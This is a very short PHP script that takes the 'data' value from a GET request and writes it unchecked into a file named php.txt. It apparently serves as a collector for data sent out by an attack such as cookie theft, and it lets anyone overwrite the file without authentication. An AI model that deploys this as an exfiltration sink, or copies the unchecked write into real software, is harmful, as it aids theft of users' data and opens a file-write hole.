<?php
$data=$_GET['data'];
$code=fopen("php.txt","w");
fwrite($code,$data);
?>